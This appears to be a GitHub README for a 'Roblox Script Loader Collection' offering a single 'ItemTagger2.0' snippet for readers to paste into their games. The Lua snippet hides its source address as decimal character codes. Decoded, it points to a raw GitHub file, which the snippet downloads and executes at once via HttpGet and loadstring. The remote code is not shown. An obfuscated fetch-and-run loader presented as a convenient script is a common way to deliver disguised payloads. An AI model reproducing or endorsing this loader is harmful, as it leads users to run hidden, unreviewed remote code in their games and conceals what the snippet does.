# Roblox Script Loader Collection

Welcome to the **Roblox Script Loader Collection**! This repository contains a list of useful Roblox scripts that you can use for your games. All scripts are dynamically loaded via `loadstring()` for convenience.

### 🌟 Table of Contents

- [ItemTagger2.0](#itemtagger20)
- [More Scripts Coming Soon](#more-scripts-coming-soon)

---

## 📜 1. ItemTagger2.0 Script

This is the first script in our collection. It dynamically loads the script from a remote server using a **`loadstring`** and **`HttpGet`** method.

```lua
-- ItemTagger2.0 Script (First in the collection)

loadstring(game:HttpGet((function()local d="";for a in("104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,97,114,111,111,115,104,98,100,50,48,50,52,47,82,111,98,108,111,120,83,99,114,105,112,116,115,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,73,116,101,109,84,97,103,103,101,114,50,46,48,46,108,117,97"):gmatch("%d+")do d=d..string.char(tonumber(a))end;return d end)()))()
